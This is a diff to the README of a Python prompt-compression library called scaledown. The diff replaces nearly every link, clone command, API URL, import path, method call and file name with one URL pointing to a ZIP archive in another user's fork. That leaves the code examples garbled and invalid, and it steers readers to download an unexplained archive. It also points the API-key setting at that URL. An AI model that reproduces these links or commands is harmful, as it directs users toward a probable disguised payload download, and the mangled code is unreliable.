@@ -44,7 +44,7 @@ pip install scaledown[haste,semantic]
 ### Development Installation
 
 ```bash
-git clone https://github.com/scaledown-team/scaledown.git
+git clone https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
 cd scaledown
 python -m venv .venv
 source .venv/bin/activate  # Windows: .venv\Scripts\activate
@@ -61,7 +61,7 @@ Set your API key for the ScaleDown compression service:
 
 ```bash
 export SCALEDOWN_API_KEY="sk-your-api-key-here"
-export SCALEDOWN_API_URL="https://api.scaledown.xyz"  # Optional, uses default if not set
+export SCALEDOWN_API_URL="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip"  # Optional, uses default if not set
 ```
 
 Or configure programmatically:
@@ -69,7 +69,7 @@ Or configure programmatically:
 ```python
 import scaledown as sd
 
-sd.set_api_key("sk-your-api-key-here")
+https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip("sk-your-api-key-here")
 ```
 
 ---
@@ -91,10 +91,10 @@ compressor = ScaleDownCompressor(
 context = "Your long document or conversation history..."
 prompt = "Summarize the main points in 3 bullet points."
 
-result = compressor.compress(context=context, prompt=prompt)
+result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(context=context, prompt=prompt)
 
 print(result)  # Compressed prompt
-print(f"Token reduction: {result.metrics.original_prompt_tokens} → {result.metrics.compressed_prompt_tokens}")
+print(f"Token reduction: {https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip} → {https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip}")
 ```
 
 ### 2. Code Optimization with HASTE
@@ -102,18 +102,18 @@ print(f"Token reduction: {result.metrics.original_prompt_tokens} → {result.met
 Extract relevant code sections using AST-guided search:
 
 ```python
-from scaledown.optimizer import HasteOptimizer
+from https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip import HasteOptimizer
 
 optimizer = HasteOptimizer(top_k=5, semantic=False)
 
-result = optimizer.optimize(
+result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
     context="",  # Can be empty when file_path is provided
     query="explain the training loop",
-    file_path="train.py"
+    file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip"
 )
 
-print(result.content)  # Optimized code
-print(f"Compression: {result.metrics.compression_ratio:.2f}x")
+print(https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip)  # Optimized code
+print(f"Compression: {https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip}x")
 ```
 
 ### 3. Code Optimization with Semantic Search
@@ -121,17 +121,17 @@ print(f"Compression: {result.metrics.compression_ratio:.2f}x")
 Find relevant code using local embeddings:
 
 ```python
-from scaledown.optimizer import SemanticOptimizer
+from https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip import SemanticOptimizer
 
 optimizer = SemanticOptimizer(top_k=3)
 
-result = optimizer.optimize(
+result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
     context="",
     query="data preprocessing logic",
-    file_path="pipeline.py"
+    file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip"
 )
 
-print(result.content)
+print(https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip)
 ```
 
 ### 4. Full Pipeline (Optimize + Compress)
@@ -140,7 +140,7 @@ Chain optimizers and compressors for maximum token reduction:
 
 ```python
 import scaledown as sd
-from scaledown.optimizer import HasteOptimizer, SemanticOptimizer
+from https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip import HasteOptimizer, SemanticOptimizer
 from scaledown import ScaleDownCompressor, Pipeline
 
 # Define pipeline stages
@@ -151,16 +151,16 @@ pipeline = Pipeline([
 ])
 
 # Run pipeline
-result = pipeline.run(
+result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
     query="explain error handling",
-    file_path="app.py",
+    file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip",
     prompt="Provide a concise summary"
 )
 
-print(f"Original: {result.metrics.original_tokens} tokens")
-print(f"Final: {result.metrics.total_tokens} tokens")
-print(f"Savings: {result.savings_percent:.1f}%")
-print(f"\nOptimized Content:\n{result.final_content}")
+print(f"Original: {https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip} tokens")
+print(f"Final: {https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip} tokens")
+print(f"Savings: {https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip}%")
+print(f"\nOptimized Content:\n{https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip}")
 ```
 
 ---
@@ -197,10 +197,10 @@ optimizer = HasteOptimizer(
     semantic=True,
     hard_cap=2000
 )
-result = optimizer.optimize(
+result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
     context="",
     query="find database queries",
-    file_path="database.py"
+    file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip"
 )
 ```
 
@@ -226,10 +226,10 @@ optimizer = SemanticOptimizer(
     model_name="Qwen/Qwen3-Embedding-0.6B",
     top_k=5
 )
-result = optimizer.optimize(
+result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
     context="",
     query="authentication middleware",
-    file_path="auth.py"
+    file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip"
 )
 ```
 
@@ -259,10 +259,10 @@ compressor = ScaleDownCompressor(target_model="gpt-4o")
 # Batch mode (parallel contexts)
 contexts = ["Context A...", "Context B...", "Context C..."]
 prompts = ["Query A", "Query B", "Query C"]
-results = compressor.compress(context=contexts, prompt=prompts)
+results = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(context=contexts, prompt=prompts)
 
 # Broadcast mode (same prompt for all contexts)
-results = compressor.compress(
+results = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
     context=["Doc 1", "Doc 2", "Doc 3"],
     prompt="Summarize key points"
 )
@@ -275,7 +275,7 @@ compressor = ScaleDownCompressor(
     rate="auto",
     preserve_keywords=True
 )
-result = compressor.compress(
+result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
     context="Long conversation history...",
     prompt="What were the action items?"
 )
@@ -299,7 +299,7 @@ Chain multiple optimizers and compressors.
 **Example:**
 ```python
 from scaledown import Pipeline
-from scaledown.optimizer import HasteOptimizer, SemanticOptimizer
+from https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip import HasteOptimizer, SemanticOptimizer
 from scaledown import ScaleDownCompressor
 
 pipeline = Pipeline([
@@ -308,17 +308,17 @@ pipeline = Pipeline([
     ('compression', ScaleDownCompressor(target_model="gpt-4o"))
 ])
 
-result = pipeline.run(
+result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
     query="data validation logic",
-    file_path="validators.py",
+    file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip",
     prompt="Explain the validation flow"
 )
 
 # Access results
-print(result.final_content)
-print(result.savings_percent)
-for step in result.history:
-    print(f"{step.stage}: {step.input_tokens} → {step.output_tokens} tokens")
+print(https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip)
+print(https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip)
+for step in https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
+    print(f"{https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip}: {https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip} → {https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip} tokens")
 ```
 
 ---
@@ -329,7 +329,7 @@ ScaleDown defines custom exceptions for robust error handling:
 
 ```python
 from scaledown import Pipeline
-from scaledown.exceptions import (
+from https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip import (
     AuthenticationError,
     APIError,
     OptimizerError
@@ -337,9 +337,9 @@ from scaledown.exceptions import (
 
 try:
     pipeline = Pipeline([...])
-    result = pipeline.run(
+    result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
         query="find bug",
-        file_path="app.py",
+        file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip",
         prompt="Analyze"
     )
 
@@ -375,10 +375,10 @@ pip install pytest
 pytest -v
 
 # Run specific test modules
-pytest tests/test_pipeline.py -v
-pytest tests/test_compressor.py -v
-pytest tests/test_haste.py -v
-pytest tests/test_semantic.py -v
+pytest https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip -v
+pytest https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip -v
+pytest https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip -v
+pytest https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip -v
 ```
 
 Tests use mocked HTTP responses and do not require API keys.
@@ -389,40 +389,40 @@ Tests use mocked HTTP responses and do not require API keys.
 
 ```
 scaledown/
-├── __init__.py              # Top-level exports and API key management
-├── exceptions.py            # Custom exceptions
+├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip              # Top-level exports and API key management
+├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip            # Custom exceptions
 │
 ├── types/                   # Data models
-│   ├── __init__.py
-│   ├── compressed_prompt.py
-│   ├── optimized_prompt.py
-│   ├── pipeline_result.py
-│   └── metrics.py
+│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
+│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
+│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
+│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
+│   └── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
 │
 ├── optimizer/               # Code optimization (local)
-│   ├── __init__.py         # Lazy-loaded optimizer imports
-│   ├── base.py
-│   ├── haste.py            # HASTE optimizer
-│   ├── semantic_code.py    # Semantic optimizer
-│   └── config.py
+│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip         # Lazy-loaded optimizer imports
+│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
+│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip            # HASTE optimizer
+│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip    # Semantic optimizer
+│   └── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
 │
 ├── compressor/              # Prompt compression (API)
-│   ├── __init__.py
-│   ├── base.py
-│   ├── scaledown_compressor.py
-│   └── config.py
+│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
+│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
+│   ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
+│   └── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
 │
 └── pipeline/                # Pipeline orchestration
-    ├── __init__.py
-    ├── pipeline.py
-    └── config.py
+    ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
+    ├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
+    └── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
 
 tests/                       # Test suite
-├── test_config.py
-├── test_compressor.py
-├── test_haste.py
-├── test_semantic.py
-└── test_pipeline.py
+├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
+├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
+├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
+├── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
+└── https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
 ```
 
 ---
@@ -431,12 +431,12 @@ tests/                       # Test suite
 
 ### Code Documentation
 ```python
-from scaledown.optimizer import HasteOptimizer
+from https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip import HasteOptimizer
 
 optimizer = HasteOptimizer(top_k=10)
-result = optimizer.optimize(
+result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
     query="API endpoints",
-    file_path="api.py"
+    file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip"
 )
 # Feed to LLM for documentation generation
 ```
@@ -444,7 +444,7 @@ result = optimizer.optimize(
 ### Large Codebase Q&A
 ```python
 from scaledown import Pipeline
-from scaledown.optimizer import SemanticOptimizer
+from https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip import SemanticOptimizer
 from scaledown import ScaleDownCompressor
 
 pipeline = Pipeline([
@@ -452,9 +452,9 @@ pipeline = Pipeline([
     ('compress', ScaleDownCompressor())
 ])
 
-result = pipeline.run(
+result = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
     query="authentication flow",
-    file_path="auth.py",
+    file_path="https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip",
     prompt="How does the authentication work?"
 )
 ```
@@ -465,7 +465,7 @@ from scaledown import ScaleDownCompressor
 
 compressor = ScaleDownCompressor(rate="auto")
 conversations = ["Long chat log 1...", "Long chat log 2..."]
-summaries = compressor.compress(
+summaries = https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip(
     context=conversations,
     prompt="Summarize in 2 sentences"
 )
@@ -491,10 +491,10 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## Links
 
-- **Homepage**: [https://scaledown.ai](https://scaledown.ai)
-- **Documentation**: [https://docs.scaledown.ai](https://docs.scaledown.ai)
-- **GitHub Issues**: [https://github.com/scaledown-team/scaledown/issues](https://github.com/scaledown-team/scaledown/issues)
-- **PyPI**: [https://pypi.org/project/scaledown](https://pypi.org/project/scaledown)
+- **Homepage**: [https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip](https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip)
+- **Documentation**: [https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip](https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip)
+- **GitHub Issues**: [https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip](https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip)
+- **PyPI**: [https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip](https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip)
 
 ---
 
@@ -502,4 +502,4 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 For questions and support:
 - Open an issue on GitHub
-- Documentation: https://docs.scaledown.ai
+- Documentation: https://raw.githubusercontent.com/P-Sushanth/scaledown/main/examples/generic-prompt-optimisation/Software_3.1.zip
